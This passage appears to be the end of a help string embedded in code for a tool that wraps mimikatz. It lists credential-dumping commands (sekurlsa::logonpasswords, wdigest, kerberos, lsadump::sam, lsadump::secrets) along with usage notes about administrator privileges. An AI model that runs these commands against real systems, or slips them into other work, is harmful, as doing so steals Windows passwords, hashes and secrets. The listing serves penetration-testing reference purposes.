  mimikatz privilege::debug sekurlsa::logonpasswords
  mimikatz privilege::debug sekurlsa::wdigest
  mimikatz privilege::debug sekurlsa::kerberos

Registry dumps:
  mimikatz privilege::debug lsadump::sam
  mimikatz privilege::debug lsadump::secrets

Note:
- Most commands require administrator privileges
- "exit" command is automatically added to prevent hanging
- No need to manually add "exit" at the end
]])
